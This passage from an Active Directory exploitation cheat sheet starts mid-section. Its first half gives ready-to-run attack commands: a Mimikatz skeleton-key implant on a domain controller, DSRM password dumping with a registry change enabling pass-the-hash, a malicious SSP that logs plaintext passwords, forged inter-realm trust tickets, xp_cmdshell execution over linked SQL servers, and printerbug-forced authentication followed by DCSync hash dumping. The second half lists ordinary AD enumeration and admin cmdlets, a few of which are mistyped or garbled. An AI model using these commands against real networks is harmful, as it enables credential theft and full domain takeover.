Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC's FQDN>

#Access using the password "mimikatz"
Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
```

### DSRM Abuse

_Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!_

```text
#Dump DSRM password (needs DA privs):
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC's Name>

#This is a local account, so we can PTH and authenticate!
#BUT we need to alter the behaviour of the DSRM account before pth:
#Connect on DC:
Enter-PSSession -ComputerName <DC's Name>

#Alter the Logon behaviour on registry:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose

#If the property already exists:
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
```

Then just PTH to get local admin access on DC!

### Custom SSP

_We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!_

From powershell:

```text
#Get current Security Package:
$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'

#Append mimilib:
$packages += "mimilib"

#Change the new packages name
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages

#ALTERNATIVE:
Invoke-Mimikatz -Command '"misc::memssp"'
```

Now all logons on the DC are logged to -&gt; C:\Windows\System32\kiwissp.log

## Cross Forest Attacks

### Trust Tickets

_If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT._

⚠️ The access we will have will be limited to what our DA account is configured to have on the other Forest!

#### Using Mimikatz:

```text
#Dump the trust key
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

#Forge an inter-realm TGT using the Golden Ticket attack
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:  
<OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
<PathToSaveTheGoldenTicket>"'
```

❗ Tickets -&gt; .kirbi format

Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!

#### Using Rubeus:

```text
.\Rubeus.exe asktgs /ticket:<kirbi file> /service:"Service's SPN" /ptt
```

### Abuse MSSQL Servers

* Enumerate MSSQL Instances: `Get-SQLInstanceDomain`
* Check Accessibility as current user:

```text
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

* Gather Information about the instance: `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
* Abusing SQL Database Links: _A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!_

Check for existing Database Links:

```text
#Check for existing Database Links:
#PowerUpSQL:
Get-SQLServerLink -Instace <SPN> -Verbose
     
#MSSQL Query:
select * from master..sysservers
```

Then we can use queries to enumerate other links from the linked Database:

```text
#Manualy:
select * from openquery("LinkedDatabase", 'select * from master..sysservers')
     
#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
Get-SQLServerLinkCrawl -Instance <SPN> -Verbose
     
#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell
#Or if it is disabled enable it:
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"
```

Query execution:

```text
Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"
```

### Breaking Forest Trusts

_If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation \(DCs have this by default\), we can use the printerbug to force the DC of the external forest's root domain to authenticate to us. Then we can capture it's TGT, inject it into memory and DCsync to dump it's hashes, giving ous complete access over the whole forest._

Tools we are going to use:

* [Rubeus](https://github.com/GhostPack/Rubeus)
* [SpoolSample](https://github.com/leechristensen/SpoolSample)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)

Exploitation example:

```text
#Start monitoring for TGTs with rubeus:
Rubeus.exe monitor /interval:5 /filteruser:target-dc$

#Execute the printerbug to trigger the force authentication of the target DC to our machine
SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local

#Get the base64 captured TGT from Rubeus and inject it into memory:
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>

#Dump the hashes of the target domain using mimikatz:
lsadump::dcsync /domain:external.forest.local /all 
```

Detailed Articles:

* [Not A Security Boundary: Breaking Forest Trusts](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
* [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)

## Enumeration using nltest and .Net

## Get Domain Information

```
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName
```

### Get Current Domain Info - Similar to Get-Domain

```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

### View Domain Forest Info

```powershell
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
```
###  View Domain Trust Information

#### Using PowerShell

```powershell
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()
```

#### Using CMD.exe

```
nltest /domain_trusts

nltest [server:<fqdn_foreign_domain>] /domain_trusts /all_trusts /v

nltest /dsgetfti:<domain>

nltest /server:<ip_dc> /domain_trusts /all_trusts
```

### View All Domain Controllers

```
nltest /dclist:$domainFQDN
net group "domain controllers" /domain
```

### View DC for Current Session

```
nltest /dsgetdc:$domainFQDN
```

## Kerberos

### get domain name and DC the user authenticated to

```
klist
```

### Get All Logged on Sessions, Includes NTLM & Kerberos

```
klist sessions
```

### View Current Kerberos Tickets

```
klist
```

### View Cached Krbtgt

```
klist tgt
```

## User Enumeration

### Get User-related Environment Variables (cmd.exe)

```
set u
```

### List all Usernames

```powershell
([adsisearcher]"(&(objectClass=User)(samaccountname=*))").FindAll().Properties.samaccountname
```

### List Administrators

```powershell
([adsisearcher]"(&(objectClass=User)(admincount=1))").FindAll().Properties.samaccountname
```

### List all Info about Specific User

#### Using PowerShell

```powershell
([adsisearcher]"(&(objectClass=User)(samaccountname=<username>))").FindAll().Properties
```

#### Using CMD.exe

```
nltest /user:"zweilos"
```

### View All Users with Description Field Set

```powershell
([adsisearcher]"(&(objectClass=group)(samaccountname=*))").FindAll().Properties | % { Write-Host $_.samaccountname : $_.description }
```


## Active Directory PowerShell Commands

#### View all Active Directory commands

```text
get-command -Module ActiveDirectory
```

#### Display Basic Domain Information

```text
Get-ADDomain
```

#### Get all Domain Controllers by Hostname and Operating

```text
Get-ADDomainController -filter * | select hostname, operatingsystem
```

#### Get all Fine Grained Password Policies

```text
Get-ADFineGrainedPasswordPolicy -filter *
```

#### Get Domain Default Password Policy

Gets the password policy from the logged in domain

```text
Get-ADDefaultDomainPasswordPolicy
```

#### Backup Active Directory System State Remotely

This will back up the domain controllers system state data. Change DC-Name to your server name and change the Backup-Path. The backup path can be a local disk or a UNC path

```text
invoke-command -ComputerName DC-Name -scriptblock {wbadmin start systemstateback up -backupTarget:"Backup-Path" -quiet}
```

## AD User PowerShell Commands

This section is all Active Directory user commands

**Get User and List All Properties \(attributes\)**

Change username to the samAccountName of the account

```text
Get-ADUser username -Properties *
```

**Get User and List Specific Properties**

Just add whatever you want to display after select

```text
Get-ADUser username -Properties * | Select name, department, title
```

#### Get All Active Directory Users in Domain

```text
Get-ADUser -Filter *
```

#### Get All Users From a Specific  OU

OU = the distinguished path of the OU

```text
Get-ADUser -SearchBase “OU=ADPRO Users,dc=ad,dc=activedirectorypro.com” -Filter *
```

#### Get AD Users by Name

This command will find all users that have the word robert in the name. Just change robert to the word you want to search for.

```text
get-Aduser -Filter {name -like "*robert*"}
```

#### Get All Disable User Accounts

```text
Search-ADAccount -AccountDisabled | select name
```

#### Disable User Account

```text
Disable-ADAccount -Identity rallen
```

#### Enable User Account

```text
Enable-ADAccount -Identity rallen
```

#### Get All Accounts with Password Set to Never Expire

```text
get-aduser -filter * -properties Name, PasswordNeverExpires | where {$_.passwordNeverExpires -eq "true" } | Select-Object DistinguishedName,Name,Enabled
```

#### Find All Locked User Accounts

```text
Search-ADAccount -LockedOut
```

#### Unlock User Account

```text
Unlock-ADAccount –Identity john.smith
```

#### List all Disabled User Accounts

```text
Search-ADAccount -AccountDisabled
```

#### Force Password Change at Next Login

```text
Set-ADUser -Identity username -ChangePasswordAtLogon $true
```

#### Move a Single User to a New OU

You will need the distinguishedName of the user and the target OU

```text
Move-ADObject -Identity "CN=Test User (0001),OU=ADPRO Users,DC=ad,DC=activedirectorypro,DC=com" -TargetPath "OU=HR,OU=ADPRO Users,DC=ad,DC=activedirectorypro,DC=com"
```

#### Move Users to an OU from a CSV

Setup a csv with a name field and a list of the users sAmAccountNames. Then just change the target OU path.

```text
# Specify target OU. $TargetOU = "OU=HR,OU=ADPRO Users,DC=ad,DC=activedirectorypro,DC=com" # Read user sAMAccountNames from csv file (field labeled "Name"). Import-Csv -Path Users.csv | ForEach-Object { # Retrieve DN of User. $UserDN = (Get-ADUser -Identity $_.Name).distinguishedName # Move user to target OU. Move-ADObject -Identity $UserDN -TargetPath $TargetOU }
```

## AD Group Commands

#### Get All members Of A Security group

```text
Get-ADGroupMember -identity “HR Full”
```

#### Get All Security Groups

This will list all security groups in a domain

```text
Get-ADGroup -filter *
```

#### Add User to Group

Change group-name to the AD group you want to add users to

```text
Add-ADGroupMember -Identity group-name -Members Sser1, user2
```

#### Export Users From a Group

This will export group members to a CSV, change group-name to the group you want to export.

```text
Get-ADGroupMember -identity “Group-name” | select name | Export-csv -path C:OutputGroupmembers.csv -NoTypeInformation
```

#### Get Group by keyword

Find a group by keyword. Helpful if you are not sure of the name, change group-name.

```text
get-adgroup -filter * | Where-Object {$_.name -like "*group-name*"}
```

#### Import a List of Users to a Group

```text
$members = Import-CSV c:itadd-to-group.csv | Select-Object -ExpandProperty samaccountname Add-ADGroupMember -Identity hr-n-drive-rw -Members $members
```

## AD Computer Commands

#### Get All Computers

This will list all computers in the domain

```text
Get-AdComputer -filter *
```

#### Get All Computers by Name

This will list all the computers in the domain and only display the hostname

```text
Get-ADComputer -filter * | select name
```

#### Get All Computers from an OU

```text
Get-ADComputer -SearchBase "OU=DN" -Filter *
```

#### Get a Count of All Computers in Domain

```text
Get-ADComputer -filter * | measure
```

#### Get all Windows 10 Computers

Change Windows 10 to any OS you want to search for

```text
Get-ADComputer -filter {OperatingSystem -Like '*Windows 10*'} -property * | select name, operatingsystem
```

#### Get a Count of All computers by Operating System

This will provide a count of all computers and group them by the operating system. A great command to give you a quick inventory of computers in AD.

```text
Get-ADComputer -Filter "name -like '*'" -Properties operatingSystem | group -Property operatingSystem | Select Name,Count
```

#### Delete a single Computer

```text
Remove-ADComputer -Identity "USER04-SRV4"
```

#### Delete a List of Computer Accounts

Add the hostnames to a text file and run the command below.

```text
Get-Content -Path C:ComputerList.txt | Remove-ADComputer
```

#### Delete Computers From an OU

```text
Get-ADComputer -SearchBase "OU=DN" -Filter * | Remote-ADComputer
```

## Group Policy

#### Get all GPO related commands

```text
get-command -Module grouppolicy
```

#### Get all GPOs by status

```text
get-GPO -all | select DisplayName, gpostatus
```

#### Backup all GPOs in the Domain

```text
Backup-Gpo -All -Path E:GPObackup
```



## Resources

* [https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)



If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!

